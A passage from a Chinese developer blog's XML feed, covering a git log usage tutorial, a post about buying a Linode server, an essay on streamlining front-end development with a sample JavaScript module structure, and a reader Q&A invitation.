class="line"><span class="addition">+~/src$ git clone https://github.com/CanonicalLtd/react-native -b ubuntu</span></span><br><span class="line"></span><br><span class="line"> And then follow the instruction in ~/src/reactnative-ubuntu/react-native-cli/README.md</span><br></pre></td></tr></table></figure></li><li><p>展示文件修改的量：<code>git log --shortstat</code></p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">commit</span> cf3ade3eff98baf710d9f4134aa9ddde2ad96920</span><br><span class="line"><span class="attribute">Merge</span>: <span class="number">25</span>a5a12 d47218e</span><br><span class="line"><span class="attribute">Author</span>: Justin McPherson &lt;justin.mcpherson@canonical.com&gt;</span><br><span class="line"><span class="attribute">Date</span>:   Thu Aug <span class="number">4</span> <span class="number">17</span>:<span class="number">57</span>:<span class="number">25</span> <span class="number">2016</span> +<span class="number">1000</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">Merge</span> pull request #<span class="number">1</span> from RodrigoHahn/patch-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"> <span class="attribute">1</span> files changed, <span class="number">22</span> insertions(+), <span class="number">12</span> deletions(-)</span><br><span class="line"></span><br><span class="line"><span class="attribute">commit</span> d47218e08cffb1479c1e3511031ae377023b01c2</span><br><span class="line"><span class="attribute">Author</span>: RodrigoHahn &lt;rodrigo.rmh@gmail.com&gt;</span><br><span class="line"><span class="attribute">Date</span>:   Wed Aug <span class="number">3</span> <span class="number">10</span>:<span class="number">16</span>:<span class="number">59</span> <span class="number">2016</span> -<span class="number">0300</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">Rename</span> README.ubuntu to README-ubuntu.md</span><br><span class="line"></span><br><span class="line"> <span class="attribute">2</span> files changed, <span class="number">226</span> insertions(+), <span class="number">226</span> deletions(-)</span><br></pre></td></tr></table></figure></li><li><p>简略展示，加分支情况：<code>git log --pretty=format:&quot;%h %s&quot; --graph</code></p><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">* b36abb0 Initial support for ImageLoader</span><br><span class="line">*   9cf8f2a <span class="keyword">Merge</span> branch <span class="string">&#x27;master&#x27;</span> of https://github.com/facebook/react-native <span class="keyword">into</span> ubuntu</span><br><span class="line">|\</span><br><span class="line">| * d363b1f <span class="keyword">Update</span> Jest APIs <span class="keyword">on</span> fbsource</span><br><span class="line">| * <span class="number">192</span>ab66 Fix <span class="number">302</span> ImageLoader caching problem <span class="keyword">on</span> iOS</span><br><span class="line">| * <span class="number">6</span>a26037 Fix <span class="keyword">build</span> <span class="keyword">break</span> of react native exopackage apps</span><br><span class="line">| * <span class="number">50</span>d8d46 Add ability <span class="keyword">to</span> expose sync hooks <span class="keyword">from</span> Java <span class="keyword">to</span> JS</span><br><span class="line">| * <span class="number">171</span>c723 Simplify message passing <span class="keyword">in</span> JSC-executor</span><br><span class="line">| * fb76154 handle <span class="literal">null</span> args <span class="keyword">array</span> <span class="keyword">in</span> proxy invocation handler</span><br><span class="line">| * <span class="number">131970</span>d Android Support Repository -&gt; Local Maven repository <span class="keyword">for</span> Support Libr…</span><br><span class="line">* | <span class="number">3</span>cf6e03 <span class="keyword">Update</span> measure <span class="keyword">function</span> <span class="keyword">to</span> match master</span><br><span class="line">* |   <span class="number">2</span>fb11b3 <span class="keyword">Merge</span> branch <span class="string">&#x27;master&#x27;</span> <span class="keyword">into</span> ubuntu</span><br><span class="line">|\ \</span><br><span class="line">| |/</span><br><span class="line">| * <span class="number">8295</span>d27 Fix usage of react-native cli inside package.json scripts</span><br><span class="line">| * b5d9bf0 <span class="keyword">merge</span> InteractionManager stuff back <span class="keyword">into</span> PanResponder</span><br><span class="line">| * dad39eb Move <span class="symbol">`Number`</span> polyfills <span class="keyword">into</span> the <span class="symbol">`/polyfills/`</span> directory</span><br></pre></td></tr></table></figure></li><li><p>查看单个文件被修改的情况：<code>git log -p React/Base/RCTAssert.m</code></p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">commit 34d5fa2695971ba9c9b2271578ade4b700061066</span><br><span class="line">Author: Nick Lockwood &lt;nicklockwood@fb.com&gt;</span><br><span class="line">Date:   Thu Jan 21 07:49:45 2016 -0800</span><br><span class="line"></span><br><span class="line">    RCTUtils Obj-C nullability annotations</span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/React/Base/RCTAssert.m b/React/Base/RCTAssert.m</span></span><br><span class="line"><span class="comment">index 4742cb3..d0006e2 100644</span></span><br><span class="line"><span class="comment">--- a/React/Base/RCTAssert.m</span></span><br><span class="line"><span class="comment">+++ b/React/Base/RCTAssert.m</span></span><br><span class="line"><span class="meta">@@ -119,7 +119,7 @@</span> void _RCTAssertFormat(</span><br><span class="line"></span><br><span class="line"> void RCTFatal(NSError *error)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="deletion">-  _RCTLogNativeInternal(RCTLogLevelFatal, NULL, 0, @&quot;%@&quot;, [error localizedDescription]);</span></span><br><span class="line"><span class="addition">+  _RCTLogNativeInternal(RCTLogLevelFatal, NULL, 0, @&quot;%@&quot;, error.localizedDescription);</span></span><br><span class="line"></span><br><span class="line">   RCTFatalHandler fatalHandler = RCTGetFatalHandler();</span><br><span class="line">   if (fatalHandler) &#123;</span><br></pre></td></tr></table></figure></li><li><p>查看 Brent Vatne 修改过的 md 文件：<code>git log --author=&#39;Brent Vatne&#39; \*.md</code></p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">commit</span> <span class="number">2</span>ed199fa2bd7b68546a0c688437657653e7dad03</span><br><span class="line"><span class="attribute">Author</span>: Brent Vatne &lt;brentvatne@gmail.com&gt;</span><br><span class="line"><span class="attribute">Date</span>:   Tue Jan <span class="number">12</span> <span class="number">12</span>:<span class="number">02</span>:<span class="number">48</span> <span class="number">2016</span> -<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">Update</span> KnownIssues.md</span><br><span class="line"></span><br><span class="line"><span class="attribute">commit</span> <span class="number">33</span>d6293c607340836372201b0e7b26d7bddba0c8</span><br><span class="line"><span class="attribute">Author</span>: Brent Vatne &lt;brentvatne@gmail.com&gt;</span><br><span class="line"><span class="attribute">Date</span>:   Mon Dec <span class="number">28</span> <span class="number">17</span>:<span class="number">51</span>:<span class="number">30</span> <span class="number">2015</span> -<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">Update</span> KnownIssues.md</span><br></pre></td></tr></table></figure></li><li><p>查看 James Ide 在 2016 年 2 月内的所有动态：<code>git log --author=&#39;James Ide&#39; --since=&#39;2016-02-01&#39; --before=&#39;2016-03-01&#39;</code></p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">commit</span> b051d07b819be7ff01ac54106ca7f0f0289d1bd0</span><br><span class="line"><span class="attribute">Author</span>: James Ide &lt;ide+github@jameside.com&gt;</span><br><span class="line"><span class="attribute">Date</span>:   Wed Feb <span class="number">10</span> <span class="number">12</span>:<span class="number">46</span>:<span class="number">26</span> <span class="number">2016</span> -<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">Update</span> CONTRIBUTING.md</span><br><span class="line"></span><br><span class="line"><span class="attribute">commit</span> <span class="number">0</span>e0f20c80683723a4f279910bd9d5a4c088fe039</span><br><span class="line"><span class="attribute">Merge</span>: <span class="number">82</span>b0df9 e59efc1</span><br><span class="line"><span class="attribute">Author</span>: James Ide &lt;ide+github@jameside.com&gt;</span><br><span class="line"><span class="attribute">Date</span>:   Wed Feb <span class="number">3</span> <span class="number">17</span>:<span class="number">27</span>:<span class="number">44</span> <span class="number">2016</span> -<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">Merge</span> pull request #<span class="number">5744</span> from LoadDOCs/loaddocs</span><br></pre></td></tr></table></figure></li><li><p>查看包含 ‘Fix bug’ 的日志，一行展示：<code>git log --grep=&#39;Fix bug&#39; --oneline</code></p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">d637621 Fix <span class="keyword">bug </span><span class="comment">#5604 - Unrecognised signal for touchable no longer on the screen</span></span><br><span class="line"><span class="number">5</span>f<span class="symbol">4390b</span> Fix <span class="keyword">bug </span>related to removeClippedSubviews <span class="keyword">and </span>view collapsing.</span><br><span class="line"><span class="number">041</span>fb59 Fix <span class="keyword">bug </span>with calculating Y offset in RecyclerViewBackedScrollView.</span><br><span class="line"><span class="number">64</span>a78ed Fix <span class="keyword">bug </span>in <span class="keyword">Android </span>elevation implementation</span><br><span class="line"><span class="number">3</span>a<span class="symbol">92f</span>20 Fix <span class="keyword">buggy </span><span class="keyword">behavior </span>of setBackgroundColor in react View.</span><br><span class="line">f4c<span class="symbol">7b</span>b1 [react-packager] Fix <span class="keyword">bug </span>on <span class="keyword">Bundles </span>Layout algorithm</span><br></pre></td></tr></table></figure></li><li><p>查看某次修改的内容：<code>git show 3a92f20</code></p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">commit <span class="number">3</span>a92f2017fc2e51c2a915f0e535397cb3937d412</span><br><span class="line">Author: Krzysztof Magiera &lt;krzysztof@fb.com&gt;</span><br><span class="line">Date:   Mon Oct <span class="number">26</span> <span class="number">14</span>:<span class="number">21</span>:<span class="number">12</span> <span class="number">2015</span> -<span class="number">0700</span></span><br><span class="line"></span><br><span class="line">    Fix buggy behavior of setBackgroundColor in react View.</span><br><span class="line"></span><br><span class="line">diff --git a<span class="regexp">/ReactAndroid/</span>src<span class="regexp">/main/</span>java<span class="regexp">/com/</span>facebook<span class="regexp">/react/</span>views<span class="regexp">/view/</span>ReactViewGroup.java b<span class="regexp">/ReactAndroid/</span>src<span class="regexp">/main/</span>java<span class="regexp">/com/</span>facebook<span class="regexp">/react/</span>views<span class="regexp">/view/</span>ReactViewGroup.java</span><br><span class="line">index b583eeb..<span class="number">6131</span>f00 <span class="number">100644</span></span><br><span class="line">--- a<span class="regexp">/ReactAndroid/</span>src<span class="regexp">/main/</span>java<span class="regexp">/com/</span>facebook<span class="regexp">/react/</span>views<span class="regexp">/view/</span>ReactViewGroup.java</span><br><span class="line">+++ b<span class="regexp">/ReactAndroid/</span>src<span class="regexp">/main/</span>java<span class="regexp">/com/</span>facebook<span class="regexp">/react/</span>views<span class="regexp">/view/</span>ReactViewGroup.java</span><br><span class="line">@@ -<span class="number">118</span>,<span class="number">18</span> +<span class="number">118</span>,<span class="number">8</span> @@ <span class="keyword">public</span> <span class="keyword">class</span> ReactViewGroup <span class="keyword">extends</span> ViewGroup <span class="keyword">implements</span></span><br><span class="line">-      Drawable backgroundDrawble = getBackground();</span><br><span class="line">-      <span class="keyword">if</span> (mReactBackgroundDrawable != <span class="keyword">null</span> &amp;&amp; (backgroundDrawble <span class="keyword">instanceof</span> LayerDrawable)) &#123;</span><br><span class="line">-        <span class="comment">// extract translucent background portion from layerdrawable</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="理解-git-log"><a href="#理解-git-log" class="headerlink" title="理解 git log"></a>理解 git log</h3><p>git log 详细记录了所有开发者在项目中的贡献情况，包括作者的信息、提交的内容（与上一次的差异对比 patch），还添加了一些额外的诸如时间、id（commit sha1）等内容。</p><p>它就像是一个数据库，提供了很多很多参数可以被重新梳理、查询。</p><table><thead><tr><th>效果</th><th>SQL</th><th>git 命令</th></tr></thead><tbody><tr><td>查询前两条</td><td><code>SELECT * FROM git-log LIMIT 0,2</code></td><td><code>git log -p -2</code></td></tr><tr><td>查询5-8条</td><td><code>SELECT * FROM git-log LIMIT 5,3</code></td><td><code>git log -p --skip=5 -3</code></td></tr><tr><td>关键词查询</td><td><code>SELECT commitMsg FROM git-log WHERE commitMsg LIKE &#39;%Fix bug%&#39;</code></td><td><code>git log --oneline --grep=&#39;Fix bug&#39;</code></td></tr><tr><td>个人日志</td><td><code>SELECT * FROM git-log WHERE DATE(ct) BETWEEN &#39;2016-02-01&#39; AND &#39;2016-03-01</code> AND author&#x3D;’James Ide’</td><td><code>git log --author=&#39;James Ide&#39; --since=&#39;2016-02-01&#39; --before=&#39;2016-03-01&#39;</code></td></tr></tbody></table><p>git-log 提供的命令相当多，可以通过 <code>git help log</code> 查看，基本上可以满足我们日常查询需求。</p><p>最后列一条十分给力的查看 git-log 全貌命令，可以通过 alias 写到 <code>.bashrc/.zshrc</code> 中：</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">alias gitlog=<span class="string">&quot;git log --all --graph --pretty=format:&#x27;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#x27; --abbrev-commit --date=relative&quot;</span></span><br></pre></td></tr></table></figure><p>效果图（点击可放大）：</p><p><img src="/../blogimgs/2016/08/04/6c0378f8gw1f6imxm25vtj21kw16p7wh.jpg" alt="git log"><!--<source src="https://ww4.sinaimg.cn/large/6c0378f8gw1f6imxm25vtj21kw16p7wh.jpg">--></p><p>本文完。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>入 linode 之前</title>
      <link href="/blog/2016/08/02/before-purchase-linode/"/>
      <url>/blog/2016/08/02/before-purchase-linode/</url>
      
        <content type="html"><![CDATA[<p>之前购买的 GreenVPN 最近死活越不了墙，在阿里云上尝试用 wget 下载资源，貌似能够连接上。于是尝试在阿里云上配置 shadowsocks，配置时提示需要使用 pip，而使用 pip 就得升级 Python(≥2.6)，折腾了一番，升级了 Python 也安装了 pip，最后却发现下载速度奇慢。</p><span id="more"></span><p><img src="/../blogimgs/2016/08/02/6c0378f8gw1f6eqkrtkhdj20p00dwwev.jpg" alt="Linode"><!--<source src="http://ww2.sinaimg.cn/large/6c0378f8gw1f6eqkrtkhdj20p00dwwev.jpg">--></p><p>不得已打算入一台国外服务器，配置 shadowsocks 以后翻墙也能稳定很多。挑了半天哪个更靠谱，最后选择 linode，注册时要求使用 visa 或者 MasterCard，并扣费 20 刀（支付宝，要争气呀！）。之前招行申请的一张 MasterCard 貌似因为没激活过期了😂，手里还有一张从来没用过的中行长城国际卓隽 visa 卡，便顺利成章地用了。</p><p>注册成功后，很快地，一封来自 linode 消费账单发到我邮箱。顷刻间想起，上次给一张外境卡转美金，购汇、转汇花了我两张毛爷爷作为手续费，如果这张卡还款又要辣么多手续费就亏大了。于是摸索这张 visa 卡如何还美金，在 BOC 寻觅了半天没找到答案，最后还是电话给客服 MM（24 小时服务，这点中行做的不错，招行他喵的下午六点就没人了），了解到这卡着实不错，跨币种使用，免手续费，到时候还等额的人民币就行了，或者直接充值一定量人民币到卡里头，让它自生自灭也行。摸索过程中还发现这卡能国外取现，美金 2500 刀，感觉挺棒！</p><p>好吧，折腾到半宿，linode 到手，剩下的工作就是在服务器配置 shadowsocks 了…-_-||</p><p>如果你也想搞一台 linode 服务器，可以使用我这个邀请码 ( <a href="https://www.linode.com/?r=69a0ed6f8e2c517588995a35654384774d49bc07">https://www.linode.com/?r=69a0ed6f8e2c517588995a35654384774d49bc07</a> )，你我都会得到一些优惠。你的优惠就是免费使用 linode 90 天，也不用像我这么折腾，刚开始还得折腾美刀的事情。</p><p>写到这里，我突然记起屈屈也在自己博客上发过一个邀请码…嗯，亏了。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linode </tag>
            
            <tag> 信用卡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工作五年，后面四年重复着第一年的活儿？</title>
      <link href="/blog/2016/07/21/donnot-repeat-yourself/"/>
      <url>/blog/2016/07/21/donnot-repeat-yourself/</url>
      
        <content type="html"><![CDATA[<p>当我们沉浸在旺盛的需求之中时，整个人便会成为一台工作的机器，切着类似的页面，写着同样的逻辑，重复着昨天或者上个月做的事情，时间久了，觉得腻味，没有什么创新，也没有明显的成长。用一句通俗的话来讲：工作五年，后面四年重复着第一年的活儿。</p><p><img src="/../blogimgs/2016/07/21/6c0378f8gw1f61wl4o981j20p00dwwhx.jpg" alt="//unsplash.com/photos/EaGsRRRcKjc by Khara Woods"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f61wl4o981j20p00dwwhx.jpg">--></p><span id="more"></span><p>很多人尝试跳出这个怪圈，不过基于环境压力和思维受阻，最后又不得不选择放弃。今天想通过介绍如何高效有保障地开发一个无线页面来帮助大家找到突破口。</p><h3 id="日常开发状态"><a href="#日常开发状态" class="headerlink" title="日常开发状态"></a>日常开发状态</h3><p>很多无线页面的开发有两种模式，一种是后台输出 JSON 数据，前端根据数据来渲染页面（同步模式）；第二种是前端异步加载后端数据然后渲染（异步模式）。当然，两种模式夹杂在一起也是存在的，这种情况一般会有一个由前端控制的中间层提供同步数据和异步数据。为了减少前后端的沟通成本，往往采用第二种模式。</p><p>拿到设计稿后，与后端同学约定接口格式，让后端同学尽快提供 mock 数据，如果提供不了，便自己构造测试数据。接着回到自己的工位上切图，切图过程中会解决好响应式问题和兼容性问题，待到后端产出真实数据时，更换 JS 中的接口地址，联调 ok 便发布页面，大功告成！</p><p>整个流程很顺畅，这对一个工作了三四年的程序员来说，没有任何压力便完成甚至提前完成了任务。但是，回过头来想一想，整个开发过程中我们留下了什么？沉淀了什么？</p><h3 id="放慢节奏，我们再走一遍流程"><a href="#放慢节奏，我们再走一遍流程" class="headerlink" title="放慢节奏，我们再走一遍流程"></a>放慢节奏，我们再走一遍流程</h3><p>对于上面的开发流程，先提出几个常见的问题：</p><ul><li>你是如何良好处理大、中、小等各型号手机的适配问题的？Media Query？等比布局？</li><li>模块如何渲染，模板和接口数据如何拼装？字符串拼接？正则替换？模板引擎？</li><li>本地、预发和线上三套环境，如何进行无痕切换？</li><li>如果开发时接口有变动，线上数据暂未产出，本地 mock 接口如何快速响应？</li><li>如何解决异步 JSONP 接口的安全问题？JSONP 接口请求异常、超时、失败等情况如何处理？</li><li>页面中的 Slide 和 Tab 逻辑如何写？复制之前写过的代码？找一个好用的组件？</li><li>图片的懒加载处理如何控制？脚本的懒执行如何控制？</li><li>首屏加载页面空白体验如何优化？</li><li>页面回退 Session 和 Token 失效如何处理？</li><li>…</li></ul><p>上面提出的几个问题，列的不全面。有一些可能是你经常碰到的，甚至有了成熟的解决方案，而也有一些问题可能是你从未考虑过的。</p><p>我们把整个前端开发流程做简单切割：切图、获取数据、渲染、事件绑定、数据统计、页面优化、监控。这种切割很暴力，也比较粗糙，不过它不妨碍我们在下面讨论，作为前端工程师，除了完成日常需求外，还要做什么？还能做什么？</p><h4 id="切图"><a href="#切图" class="headerlink" title="切图"></a>切图</h4><p>隐约还记得三年前，我接了一个无线页面的外包活儿，页面的结构很简单，但我做的很糟糕。为了适配不同尺寸的机型，我写了无数 Media Query，加上当时采用的 em 作单位，很多细节位置都没控制好。</p><p>回到现在，已经有了很通用、主流的方案——使用 rem，动态计算 html 标签的 <code>font-size</code>，思路很简单，但是存在不少的坑，和一些较难理解的概念，Google 搜索下 <code>lib-flexible</code> 能够找到这些问题以及解决方案。不过我们切图时还可以思考一些其他的问题：</p><ul><li>各类静态资源（image&#x2F;css&#x2F;js&#x2F;font）如何放置？新建各种文件夹？</li><li>是否还是修改代码再刷新页面的调试手段？考虑过 liveload？</li><li>CSS 复用率如何？跨项目的复用率呢？使用预处理语言封装基类？</li><li>还在心算从 px 折算为 rem？用计算器算？</li><li>身旁放 20 台机器测试页面兼容性？</li></ul><p>以上问题，没有哪一个会让人特别苦恼，但是堆积起来，却让我们的开发效率和开发体验落后了好几个档次。这些问题并非无解，我们可以尝试着帮助同事和团队找到问题的答案，比如：</p><ul><li>统一团队的本地构建环境，初始化一个工程目录的脚手架</li><li>统一打包脚本，实时编译和预览</li><li>封装预处理基类，屏蔽 rem 计算，比如编译时自动转换 px 为 rem</li><li>构建云测平台，云端测试各种机型兼容性，打开网页输入网址即可批量测试</li></ul><p>有些解决方案只需要几行脚本就能搞定，而有一些可能需要投入时间和精力。</p><h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p>本地、预发、线上三套环境，如何做到环境的顺滑切换？我在百度的时候，团队最常用的方案就是：</p><ul><li>线上测试，本地反向代理到预发或者线上环境；</li><li>本地测试，则使用 apache 开启服务提供 mock 接口</li></ul><p>可一旦与后端约定的接口有变动，本地 mock 数据也要跟着一起变动。这个问题有什么好的处理方案？在团队中，好的方案一定不是几行文字的提示或指引，而是通过流程和监控来控制！</p><p>这里提到的获取数据，细想之下可不是什么轻松的事情。有很多问题需要思考：</p><ul><li>如何保障 JSONP 数据的安全问题？refer 限制？token 验证？</li><li>数据来源很多，如何减少页面的请求数量？让后端合并数据？如果是多个团队提供数据呢？</li><li>如何控制需求变化导致的接口格式变化？</li><li>如何处理接口的不稳定问题？</li><li>如何处理超时问题？</li><li>如何产生容灾数据？如何获取容灾数据？</li><li>如何控制数据缓存？如前端控制缓存一分钟？</li><li>如何对接口做监控？</li><li>如何减少数据的重复请求问题？</li></ul><p>以上每个问题都有很多处理方案，而这些问题不仅仅是自己会遇到，身边的同事也会遇到。如果可以站在团队的角度去思考问题，很多思路会比较容易涌现出来，比如：</p><ul><li>构建一个平台，用于接口格式约定，通过约定好的格式，系统自动生成 mock 数据，用于本地开发，后端也必须遵循这个接口约定，任何接口的变动，mock 数据自动变动</li><li>构建一个平台，让不规范的数据进入这个平台，规范化输出，前端只考虑规范化的接口提示和解析，同时该平台产出数据的备份接口</li><li>前端添加一个请求 Hub，当页面有很多请求出来时，合并请求统一发出，当数据回来时，统一储存和过滤</li></ul><p>数据是最容易出问题的地方，每一个接口请求都需要一大堆的逻辑处理异常。倘若接口格式、开发流程和前端模式都可以规范化，我们需要做的就剩下套公式，这种高效你能否想象？</p><h4 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h4><p>大胆地揣测下大家在写一个模块的时候，跟我一样也是这么划分的函数：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Module</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">init</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">init</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">fetchData</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定事件</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bindEvent</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取数据</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">fetchData</span> = <span class="keyword">function</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="title function_">ajax</span>(&#123;&#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    self.<span class="title function_">renderData</span>(data);</span><br><span class="line">  &#125;).<span class="title function_">catch</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    self.<span class="title function_">_fetchDataFailed</span>();</span><br><span class="line">  &#125;).<span class="title function_">fin</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    cb &amp;&amp; <span class="title function_">cb</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 渲染数据</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">renderData</span> = <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">  data = <span class="variable language_">this</span>.<span class="title function_">_resolveData</span>(data);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">bindEvent</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理数据</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">_resolveData</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载失败</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">_fetchDataFailed</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>不管一个模块有多么简单，它基本都会包含以上步骤，倘若没有用函数隔离每步操作的意图，代码会显得十分散乱。我经常看到，有同学把「渲染」这一块的代码被放到「获取数据」甚至是「初始化」中，这种程序结构显然是不合理的。同时，也经常会看到渲染时，</p><ul><li>在代码中写大量的字符串模板</li><li>写一个工具函数，解析字符串模块中的循环逻辑</li><li>使用 replace 函数正则替换字符串变量</li><li>使用 innerHTML 函数插入拼装好的字符串</li><li>在渲染模块中添加大量逻辑</li></ul><p>以上，没有哪一种是不正确的，我也没有对哪一种写法开喷的意图。但是至少我们可以在多次编程经验中提炼出一些有价值的内容：</p><ul><li>团队统一的模板引擎，并且提供模块的离线编译，提高线上运行效率</li><li>提供安全机制，保障插入的数据不会产生安全问题</li><li>严格编程范式，分离视图和逻辑层，把数据处理好了再送入模板</li></ul><p>有一个可执行的编码规范，加上适当合理的 Code Review，整个团队代码便会如出一辙。</p><h3 id="后续操作"><a href="#后续操作" class="headerlink" title="后续操作"></a>后续操作</h3><p>本想写成一篇长文，把每个环节可以综合考虑的问题都提出来，不过本文的目的，只是表述一些观点，期望大家在编程的时候，有更多基于团队的思考，针对具体问题提出一些通用的解决方案。比如下面，再提出几个问题：</p><ul><li>首屏加载白屏问题，如何处理？本地缓存？等待提示？假数据？同步输出？</li><li>如何减少页面的请求？资源内敛？如何做到自动内敛所有的资源？</li><li>页面报错的统计如何做？做了之后如何分析？分析之后如何推动线上错误减少？</li><li>页面发布时如何自动回归检测？点下链接看看是否 404？打开控制台看看是否有报错？滚屏看看图片是否加载正确？</li><li>…</li></ul><p>以上问题，都有相当成熟的解决方案，那你们团队呢？</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>当发现工作做起来索然无味的时候，我脑海中蹦出来的第一个念头是：最近是不是有点放纵了？</p><p>我喜欢用编程解决问题，只要是重复的事情，我一定会想尽办法简化，然后交给机器去做。我希望今年可以用程序解决更多的问题。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>向小胡子哥提问</title>
      <link href="/blog/2016/07/14/question-and-answer/"/>
      <url>/blog/2016/07/14/question-and-answer/</url>
      
        <content type="html"><![CDATA[<p><img src="/../blogimgs/2016/07/14/6c0378f8gw1f5t7g1e2i9j20p00dwac9.jpg" alt="//unsplash.com/photos/i--IN3cvEjg by Evan Dennis"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f5t7g1e2i9j20p00dwac9.jpg">--></p><p>欢迎向小胡子哥提问，由于个人精力有限，并不是每一个问题都会去回答。</p><span id="more"></span><p>如果你期望看到我的回答，可以把问题整理好，通过邮箱或者留言方式发给我：</p><ul><li>邮箱地址：<a href="mailto:&#x62;&#97;&#x72;&#114;&#x65;&#x74;&#46;&#99;&#x68;&#x69;&#x6e;&#x61;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#111;&#109;">&#x62;&#97;&#x72;&#114;&#x65;&#x74;&#46;&#99;&#x68;&#x69;&#x6e;&#x61;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#111;&#109;</a></li><li>留言地址：<a href="https://www.barretlee.com/message/">https://www.barretlee.com/message/</a></li></ul><p>只要你的问题是完整的、网上搜索不到满意答案的，并且在我能够回答范围之内，我都会认真作答。</p><p>对于询问「如何入门」、「如何成长」之类的问题，我可能不会单独回答，而是写一个 PPT、或者一篇文章来阐述我的观点。</p><p>十分期望提问的同学能够学会使用搜索引擎。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提问 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在公众号中优雅地呈现代码</title>
      <link href="/blog/2016/07/14/codes-in-wechat/"/>
      <url>/blog/2016/07/14/codes-in-wechat/</url>
      
